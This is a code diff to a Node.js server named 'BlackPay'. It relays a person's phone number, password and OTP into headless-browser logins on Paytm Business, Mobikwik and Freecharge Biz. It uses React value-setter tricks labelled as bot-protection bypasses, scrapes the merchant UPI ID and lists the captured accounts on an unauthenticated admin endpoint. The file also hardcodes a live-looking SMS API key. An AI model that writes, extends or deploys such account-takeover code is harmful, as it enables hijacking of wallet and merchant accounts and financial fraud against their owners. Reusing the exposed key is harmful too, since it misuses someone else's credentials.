@@ -17,7 +17,7 @@ app.use(cors());
 const FAST2SMS_API_KEY = "dl51mufyW8oVtTEzHYnKXIUjx6GSMFDCR93JBObN40saehLqkvG5HnUSwa6mIzVDYso8p7AWhEQJNXPc";
 
 const activeSessions = new Map();
-const linkedAccounts = []; // 🚀 DASHBOARD KE LIYE DATA YAHAN SAVE HOGA
+const linkedAccounts = []; 
 let globalBrowser = null; 
 let browserStartupError = null;
 
@@ -56,26 +56,19 @@ let browserStartupError = null;
 app.get('/', (req, res) => res.json({ success: true, message: "BlackPay Ultra-Fast Server is Live!" }));
 
 // ============================================================================
-// 🚀 BANK DETAILS API (NOW FETCHING DYNAMICALLY FROM banks.json)
+// 🚀 BANK DETAILS API
 // ============================================================================
 app.get('/api/get-payment-details', (req, res) => {
     try {
         const banksData = fs.readFileSync('banks.json', 'utf8');
         const bankList = JSON.parse(banksData);
-
         const randomIndex = Math.floor(Math.random() * bankList.length);
-        const selectedBank = bankList[randomIndex];
-
-        res.json({ success: true, data: selectedBank });
+        res.json({ success: true, data: bankList[randomIndex] });
     } catch (error) {
-        console.error("Bank fetch error:", error);
-        res.status(500).json({ success: false, message: "Server error fetching bank details. Is banks.json created?" });
+        res.status(500).json({ success: false, message: "Server error fetching bank details." });
     }
 });
 
-// ============================================================================
-// 🚀 ADMIN DASHBOARD API
-// ============================================================================
 app.get('/api/admin/live-upis', (req, res) => {
     res.json({ success: true, data: linkedAccounts });
 });
@@ -101,7 +94,7 @@ app.post('/api/auth/send-otp', async (req, res) => {
 });
 
 // ============================================================================
-// 1. API: SEND OTP TO WALLET (SUPER FAST)
+// 1. API: SEND OTP TO WALLET (SUPER FAST & AGGRESSIVE BYPASS)
 // ============================================================================
 app.post('/api/wallet/send-otp', async (req, res) => {
     const phone = req.body.number || req.body.phone;
@@ -113,7 +106,6 @@ app.post('/api/wallet/send-otp', async (req, res) => {
 
     let walletName = walletType ? walletType.toLowerCase().trim() : "freecharge";
 
-    // Clean old session
     if (activeSessions.has(phone)) {
         try { await activeSessions.get(phone).context.close(); } catch(e) {}
         activeSessions.delete(phone);
@@ -134,6 +126,7 @@ app.post('/api/wallet/send-otp', async (req, res) => {
         
         // 🚀 PAYTM BUSINESS LOGIC
         if (walletName.includes('paytm')) {
+            console.log(`[+] Paytm Business Web khol rahe hain...`);
             if (!password) {
                 await context.close();
                 return res.status(400).json({ success: false, message: "Paytm Business requires a password!" });
@@ -165,7 +158,7 @@ app.post('/api/wallet/send-otp', async (req, res) => {
             }
 
             await inputField.focus(); await inputField.click({ clickCount: 3 }); await inputField.press('Backspace');      
-            await inputField.type(phone, { delay: 0 });
+            await inputField.type(phone, { delay: 10 });
 
             let passField = null; 
             for (let attempt = 0; attempt < 30; attempt++) {
@@ -186,117 +179,93 @@ app.post('/api/wallet/send-otp', async (req, res) => {
             
             if (passField) {
                 await passField.focus(); await passField.click({ clickCount: 3 }); await passField.press('Backspace');
-                await passField.type(password, { delay: 0 });
+                await passField.type(password, { delay: 10 });
             }
             await page.keyboard.press('Enter');
         }
         
-        // 🚀 MOBIKWIK LOGIC (UPDATED & FIXED)
+        // 🚀 MOBIKWIK LOGIC (HARDCORE REACT BYPASS)
         else if (walletName.includes('mobikwik')) {
             console.log(`[+] Mobikwik Web khol rahe hain...`);
-            await page.goto('https://www.mobikwik.com/login', { waitUntil: 'domcontentloaded', timeout: 25000 });
+            await page.goto('https://www.mobikwik.com/login', { waitUntil: 'networkidle2', timeout: 30000 });
             
-            let inputField = null;
-            for (let attempt = 0; attempt < 50; attempt++) {
-                try {
-                    // Sabse pehle phone number wale inputs dhundho
-                    let inputs = await page.$$('input[type="tel"], input[maxlength="10"], input[name="mobileNumber"]');
-                    if (inputs.length === 0) {
-                        inputs = await page.$$('input:not([type="hidden"])');
-                    }
+            console.log(`[+] Forcing Javascript Number Injection...`);
+            
+            await page.evaluate(async (num) => {
+                // Find correct input by checking type or length
+                let inputs = Array.from(document.querySelectorAll('input'));
+                let targetInput = inputs.find(inp => inp.type === 'tel' || inp.maxLength === 10 || (inp.placeholder && inp.placeholder.toLowerCase().includes('mobile')));
+                
+                if (targetInput) {
+                    targetInput.focus();
+                    targetInput.click();
                     
-                    for (let el of inputs) {
-                        let box = await el.boundingBox();
-                        // Check karo ki box sach mein visible hai (Search bar bypass karne ke liye)
-                        if (box && box.width > 30 && box.height > 10) { 
-                            inputField = el; 
-                            break; 
-                        }
-                    }
-                } catch(e) {}
-                if (inputField) break;
-                await new Promise(r => setTimeout(r, 100));
-            }
+                    // React 15/16 native value setter bypass
+                    let nativeInputValueSetter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, "value").set;
+                    nativeInputValueSetter.call(targetInput, num);
+                    
+                    targetInput.dispatchEvent(new Event('input', { bubbles: true }));
+                    targetInput.dispatchEvent(new Event('change', { bubbles: true }));
+                }
+            }, phone);
 
-            if (inputField) {
-                console.log(`[+] Mobikwik input mil gaya, Number type kar rahe hain: ${phone}`);
-                await inputField.focus(); 
-                await inputField.click({ clickCount: 3 }); 
-                await inputField.press('Backspace');
-                // Type with delay to bypass bot protection
-                await inputField.type(phone, { delay: 50 }); 
-            } else {
-                console.log(`[-] Box nahi mila, directly type kar rahe hain...`);
-                await new Promise(r => setTimeout(r, 1000));
-                await page.keyboard.type(phone, { delay: 50 });
-            }
+            await new Promise(r => setTimeout(r, 1000));
             
-            await new Promise(r => setTimeout(r, 500));
-            
-            // "Send OTP" ya "Continue" button par click karne ka try
+            console.log(`[+] Clicking Get OTP Button...`);
             await page.evaluate(() => {
                 let btns = Array.from(document.querySelectorAll('button, span, div'));
-                let sendBtn = btns.find(b => b.innerText && (b.innerText.toLowerCase().includes('send otp') || b.innerText.toLowerCase().includes('continue')));
-                if(sendBtn) sendBtn.click();
+                let getOtpBtn = btns.find(b => b.innerText && (b.innerText.toLowerCase().includes('get otp') || b.innerText.toLowerCase().includes('continue') || b.innerText.toLowerCase().includes('send otp')));
+                if(getOtpBtn) getOtpBtn.click();
             });
 
             await page.keyboard.press('Enter');
         }
         
-        // 🚀 FREECHARGE BIZ LOGIC
+        // 🚀 FREECHARGE BIZ LOGIC (HARDCORE REACT BYPASS)
         else if (walletName.includes('freecharge')) {
-            await page.goto('https://www.freechargebiz.in/', { waitUntil: 'domcontentloaded', timeout: 25000 });
+            console.log(`[+] Freecharge Biz Web khol rahe hain...`);
+            await page.goto('https://www.freechargebiz.in/', { waitUntil: 'networkidle2', timeout: 30000 });
             
-            let loginClicked = false;
+            // 1. Click Login Button
+            console.log(`[+] Clicking Login...`);
             for (let attempt = 0; attempt < 30; attempt++) {
                 try {
                     let clicked = await page.evaluate(() => {
-                        let buttons = Array.from(document.querySelectorAll('button, a, div'));
+                        let buttons = Array.from(document.querySelectorAll('button, a, div, span'));
                         let target = buttons.find(b => b.innerText && b.innerText.trim().toLowerCase() === 'login');
-                        if (target) {
-                            target.click();
-                            return true;
-                        }
+                        if (target) { target.click(); return true; }
                         return false;
                     });
-                    if (clicked) {
-                        loginClicked = true;
-                        break;
-                    }
+                    if (clicked) break;
                 } catch(e) {}
-                await new Promise(r => setTimeout(r, 200));
+                await new Promise(r => setTimeout(r, 300));
             }
 
-            await new Promise(r => setTimeout(r, 1500));
+            await new Promise(r => setTimeout(r, 2000));
 
-            let inputField = null;
-            for (let attempt = 0; attempt < 40; attempt++) {
-                try {
-                    let inputs = await page.$$('input:not([type="hidden"])');
-                    for (let el of inputs) {
-                        let box = await el.boundingBox();
-                        if (box && box.width > 0 && box.height > 0) {
-                            inputField = el;
-                            break;
-                        }
-                    }
-                } catch(e) {}
-                if (inputField) break;
-                await new Promise(r => setTimeout(r, 200));
-            }
+            // 2. Inject Number via React Hack
+            console.log(`[+] Forcing Freecharge Number Injection...`);
+            await page.evaluate(async (num) => {
+                let inputs = Array.from(document.querySelectorAll('input:not([type="hidden"])'));
+                let targetInput = inputs.find(inp => inp.type === 'tel' || inp.maxLength === 10 || (inp.name && inp.name.toLowerCase().includes('mobile')));
+                
+                if (targetInput) {
+                    targetInput.focus();
+                    targetInput.click();
+                    let nativeInputValueSetter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, "value").set;
+                    nativeInputValueSetter.call(targetInput, num);
+                    targetInput.dispatchEvent(new Event('input', { bubbles: true }));
+                    targetInput.dispatchEvent(new Event('change', { bubbles: true }));
+                }
+            }, phone);
 
-            if (inputField) {
-                await inputField.focus(); 
-                await inputField.click({ clickCount: 3 }); 
-                await inputField.press('Backspace');
-                await inputField.type(phone, { delay: 10 });
-            } else {
-                await page.keyboard.type(phone, { delay: 10 });
-            }
+            await new Promise(r => setTimeout(r, 1000));
 
+            // 3. Click Get OTP
+            console.log(`[+] Clicking Get OTP Button...`);
             await page.evaluate(() => {
                 let elements = Array.from(document.querySelectorAll('button, div, span'));
-                let btn = elements.find(el => el.innerText && el.innerText.trim().toLowerCase().includes('get otp'));
+                let btn = elements.find(el => el.innerText && el.innerText.trim().toLowerCase().includes('get otp') || el.innerText.trim().toLowerCase().includes('continue'));
                 if (btn) btn.click();
             });
 
@@ -336,71 +305,22 @@ app.post('/api/wallet/verify-otp', async (req, res) => {
 
     try {
         console.log(`[+] Injecting OTP for ${phone}: ${otp}`);
-        let frames = []; try { frames = [page, ...page.frames()]; } catch(e) { frames = [page]; }
-        let otpTyped = false; 
-
-        let otpApiPromise = new Promise((resolve) => {
-            let isResolved = false;
+        
+        // Smart OTP Injection Hack
+        await page.evaluate(async (otpCode) => {
+            let inputs = Array.from(document.querySelectorAll('input:not([type="hidden"])'));
+            let targetInput = inputs.find(inp => inp.type === 'tel' || inp.type === 'number' || (inp.placeholder && inp.placeholder.toLowerCase().includes('otp')) || inputs.length > 0);
             
-            const handler = async (response) => {
-                if (isResolved) return;
-                try {
-                    const req = response.request(); if (req.method() === 'OPTIONS') return;
-                    const url = response.url().toLowerCase(); const type = req.resourceType();
-                    
-                    if (type === 'xhr' || type === 'fetch') {
-                        const text = await response.text();
-                        if (url.includes('verify') || url.includes('login') || url.includes('auth') || url.includes('otp')) {
-                            const textLower = text.toLowerCase();
-                            if (response.status() >= 400 || textLower.includes('"success":false') || textLower.includes('invalid otp') || textLower.includes('incorrect') || textLower.includes('wrong')) { 
-                                isResolved = true; resolve(false); 
-                            } else if (textLower.includes('token') || textLower.includes('success":true')) {
-                                isResolved = true; resolve(true);
-                            }
-                        }
-                    }
-                } catch(e) {} 
-            };
-            page.on('response', handler);
-
-            setTimeout(async () => { 
-                if (!isResolved) { 
-                    try {
-                        const hasError = await page.evaluate(() => {
-                            const body = document.body.innerText.toLowerCase();
-                            return body.includes('incorrect otp') || body.includes('invalid otp') || body.includes('wrong otp');
-                        });
-                        isResolved = true; 
-                        resolve(!hasError); 
-                    } catch(e) {
-                        isResolved = true; resolve(false);
-                    }
-                } 
-            }, 5000);
-        });
-
-        for (let attempt = 0; attempt < 30; attempt++) {
-            for (let frame of frames) {
-                try {
-                    let inputs = await frame.$$('input:not([type="hidden"])');
-                    for (let el of inputs) {
-                        let box = await el.boundingBox();
-                        if (box && box.width > 0 && box.height > 0) {
-                            await el.focus(); await el.click({ clickCount: 3 }); await el.press('Backspace');
-                            // OTP bhi dhire-dhire type karo
-                            await el.type(otp, { delay: 50 }); 
-                            await frame.evaluate((inp) => { try { inp.blur(); } catch(err) {} }, el);
-                            otpTyped = true; break;
-                        }
-                    }
-                } catch (e) {}
-                if (otpTyped) break;
+            if(targetInput) {
+                targetInput.focus();
+                let nativeInputValueSetter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, "value").set;
+                nativeInputValueSetter.call(targetInput, otpCode);
+                targetInput.dispatchEvent(new Event('input', { bubbles: true }));
+                targetInput.dispatchEvent(new Event('change', { bubbles: true }));
             }
-            if (otpTyped) break;
-            await new Promise(r => setTimeout(r, 100));
-        }
+        }, otp);
 
-        if (!otpTyped) { try { await page.keyboard.type(otp, { delay: 50 }); } catch(e){} }
+        await new Promise(r => setTimeout(r, 1000));
         
         await page.keyboard.press('Enter');
         try {
@@ -411,16 +331,20 @@ app.post('/api/wallet/verify-otp', async (req, res) => {
             });
         } catch(e) {}
 
-        const isOtpSuccess = await otpApiPromise;
-
-        if (!isOtpSuccess) { 
-            return res.status(400).json({ success: false, message: "Invalid OTP! Please enter correct OTP." }); 
-        }
-
         let currentUrl = ""; try { currentUrl = page.url() || ""; } catch(e) { currentUrl = currentWallet; }
         let finalUpi = "";
 
-        await new Promise(r => setTimeout(r, 3000));
+        await new Promise(r => setTimeout(r, 5000)); // Wait for login to process
+
+        // Error detection logic (Basic check)
+        const hasError = await page.evaluate(() => {
+            const body = document.body.innerText.toLowerCase();
+            return body.includes('incorrect otp') || body.includes('invalid otp') || body.includes('wrong otp');
+        });
+
+        if (hasError) { 
+            return res.status(400).json({ success: false, message: "Invalid OTP! Please enter correct OTP." }); 
+        }
 
         if (currentUrl.includes('paytm') || currentWallet.includes('paytm')) {
             console.log(`[+] Smart Mode ON: Hunting for @pty Merchant UPI via Network Traffic...`);
@@ -439,13 +363,10 @@ app.post('/api/wallet/verify-otp', async (req, res) => {
                 } catch(e) {}
             });
 
-            try { 
-                await page.goto('https://dashboard.paytm.com/next/profile', { waitUntil: 'networkidle2', timeout: 15000 }); 
-            } catch(e) {}
+            try { await page.goto('https://dashboard.paytm.com/next/profile', { waitUntil: 'networkidle2', timeout: 15000 }); } catch(e) {}
 
             for (let i = 0; i < 15; i++) {
                 if (finalUpi && finalUpi.includes('@pty')) break; 
-
                 try {
                     let scrapedUpi = await page.evaluate(() => {
                         const regex = /[a-zA-Z0-9.\-_]+@(pty|paytmpty)/i;
@@ -481,7 +402,7 @@ app.post('/api/wallet/verify-otp', async (req, res) => {
             activeSessions.delete(phone);
             return res.status(400).json({ 
                 success: false, 
-                message: "Wallet linking failed. Merchant UPI ID (@pty) could not be verified." 
+                message: "Wallet linking failed. Merchant UPI ID could not be verified." 
             });
         }
 
